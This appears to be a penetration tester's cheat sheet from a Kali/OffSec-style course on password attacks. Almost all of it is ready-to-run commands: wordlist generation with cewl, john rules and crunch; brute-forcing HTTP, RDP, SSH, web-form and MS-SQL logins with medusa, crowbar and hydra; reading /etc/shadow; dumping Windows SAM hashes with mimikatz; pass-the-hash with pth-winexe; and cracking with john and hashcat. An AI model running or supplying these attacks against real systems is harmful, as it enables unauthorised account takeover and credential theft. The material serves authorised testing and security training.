### Password attack

```
cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt


```

/etc/john/john.conf

locate the [List.Rules:Wordlist] segment where wordlist mutation rules are defined, and append a new rule. In this example, we will append the two-digit sequence of numbers from (double) zero to ninety-nine after each word in our wordlist.
We will begin this rule with the $ character, which tells John to append a character to the original word in our wordlist. Next, we specify the type of character we want to append, in our case we want any number between zero and nine ([0-9]). Finally, to append double-digits, we will simply repeat the $[0-9] sequence

```
kali@kali:~$ sudo nano /etc/john/john.conf ...
# Wordlist mode rules [List.Rules:Wordlist]
# Try words as they are
:
# Lowercase every pure alphanumeric word
-c >3 !?X l Q
# Capitalize every pure alphanumeric word
-c (?a >2 !?X c Q
# Lowercase and pluralize pure alphabetic words ...
# Try the second half of split passwords
-s x_
-s-c x_ M l Q
# Add two numbers to the end of each password $[0-9]$[0-9]
...
```

#### Run John

```
 john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
```

### Generate password

Password pattern: Abc$#123

```
crunch 8 8 -t ,@@^^%%%

```

Supplying characters to use:
```
crunch 4 6 0123456789ABCDEF -o crunch.txt
```

Specifying predefined character-sets

```
 crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
```

### HTTP htaccess attack with Medusa

```
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin

```

### RDP Protocol attack

```
sudo apt install crowbar

crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1

```

### SSH attack with THC-Hydra

```
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1

``
### HTTP POST Attack with THC-Hydra

```
hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f

```
#### ms-sql password brute

```
hydra -l sa -P /usr/share/nmap/nselib/data/passwords.lst mssql://10.11.1.227:27900

```
### Retrieving password hashes

```
hashid c43ee559d69bc7f691fe2fbfe8a5ef0a

hashid '$6$l5bL6XIASslBwwUD$bCxeTlbhTH76wE.bI66aMYSeDXKQ8s7JNFwa1s1KkTand6ZsqQKAF3G0tHD9bd59e 5NAz/s7DQcAojRTWNpZX0'
Analyzing '$6$l5bL6XIASslBwwUD$bCxeTlbhTH76wE.bI66aMYSeDXKQ8s7JNFwa1s1KkTand6ZsqQKAF3G0tHD9bd59e 5NAz/s7DQcAojRTWNpZX0'
[+] SHA-512 Crypt

```

```
sudo greo root /etc/shadow


```

#### Windows system - mimikatz

```
C:\Tools\password_attacks\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam

```

#### Pass the hash

```
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd

```

#### Password cracking

```
sudo john hash.txt --format=NT
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt -- format=NT
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt

hashcat64.exe -b
```

The --fork option engages multiple processes to make use of more CPU cores on a single machine and --node splits the work across multiple machines.


zip2john x.zip > x.txt

john --wordlist=/usr/share/wordlists/rockyou.txt x.txt


